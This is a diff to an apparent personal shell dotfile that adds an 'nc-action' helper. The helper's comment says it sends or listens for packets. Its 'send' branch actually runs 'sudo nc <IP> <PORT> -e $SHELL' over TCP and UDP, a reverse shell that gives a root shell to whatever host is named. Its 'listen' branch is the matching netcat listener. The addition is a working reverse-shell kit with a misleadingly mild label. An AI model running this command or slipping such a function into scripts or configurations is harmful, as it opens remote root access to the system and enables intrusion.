@@ -231,6 +231,33 @@ picom-toggle() { # Toggle picom
     fi
 }
 
+nc-action() { # Send or Listen packets
+    local action="$1"
+    case "$action" in
+        "listen")
+            if [ "$#" -ne 3 ]; then
+                echo "Usage: nc-action listen <IP> <PORT>" >&2
+                return 1
+            else
+                sudo nc -lvnp "$3" -s "$2"
+            fi
+            ;;
+        "send")
+            if [ "$#" -ne 3 ]; then
+                echo "Usage: nc-action send <IP> <PORT>" >&2
+                return 1
+            else
+                sudo nc "$2" "$3" -e "$SHELL"
+                sudo nc --udp "$2" "$3" -e "$SHELL"
+            fi
+            ;;
+        *)
+            echo "Unknown action. Usage: nc-action [listen|send] <arguments>" >&2
+            return 1
+            ;;
+    esac
+}
+
 ytm-dl() { # Youtube music/playlist downloader in ./Music and also thumbnails depends from yt-dlp
     cd ~/Music
     if [ -z "$1" ]; then
